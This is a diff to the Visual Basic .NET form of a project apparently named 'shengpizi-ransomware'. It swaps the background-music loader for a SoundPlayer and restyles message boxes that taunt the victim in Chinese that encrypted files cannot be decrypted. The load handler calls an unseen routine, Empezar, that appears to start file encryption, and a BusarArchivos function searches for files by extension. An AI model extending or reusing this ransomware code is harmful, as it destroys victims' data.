@@ -8,14 +8,16 @@ Imports System.Security.Cryptography
 Imports System.Text
 
 Public Class Form1
-    Private Sub Play_Music(ByVal Mname As String)
-        Dim res As IO.Stream = Reflection.Assembly.GetEntryAssembly.GetManifestResourceStream("shengpizi-ransomware" & Mname) '把这里的'宇宙诗集'更改为你的工程名
-        Dim bytes(res.Length - 1) As Byte
-        res.Read(bytes, 0, bytes.Length)
-        My.Computer.Audio.Play(bytes, AudioPlayMode.BackgroundLoop)
-    End Sub
+    'Private Sub Play_Music(ByVal Mname As String)
+    'Dim res As IO.Stream = Reflection.Assembly.GetEntryAssembly.GetManifestResourceStream("shengpizi-ransomware" & Mname)
+    ' Dim bytes(res.Length - 1) As Byte
+    '     res.Read(bytes, 0, bytes.Length)
+    '    My.Computer.Audio.Play(bytes, AudioPlayMode.BackgroundLoop)
+    ' End Sub
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-        Play_Music("bgm.wav")
+        Dim a As New Media.SoundPlayer
+        a.SoundLocation = Application.StartupPath + "\bgm.wav"
+        a.PlayLooping()
         Call Empezar()
     End Sub
     Public Shared Function BusarArchivos(ruta As String, mExtesiones As IEnumerable(Of String)) As IEnumerable(Of String)
@@ -53,10 +55,10 @@ Public Class Form1
         Next
     End Sub
     Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
-        MsgBox("我仅仅是个按钮")
-        MsgBox("点我干嘛")
-        MsgBox("口亨")
-        MsgBox("自己想办法去")
+        MsgBox("我仅仅是个按钮", 16, "emmm")
+        MsgBox("点我干嘛", 16, "emmm")
+        MsgBox("口亨", 16, "emmm")
+        MsgBox("自己想办法去", 16, "emmm")
     End Sub
 
     Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click
@@ -68,10 +70,10 @@ Public Class Form1
     End Sub
 
     Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
-        MsgBox("已加密的文件无法解密")
-        MsgBox("谁让你知识短浅")
-        MsgBox("口亨")
-        MsgBox("不和你多说了，再见！！！")
+        MsgBox("已加密的文件无法解密", 16, "emmm")
+        MsgBox("谁让你知识短浅", 16, "emmm")
+        MsgBox("口亨", 16, "emmm")
+        MsgBox("不和你多说了，再见！！！", 16, "emmm")
         End
     End Sub
 End Class
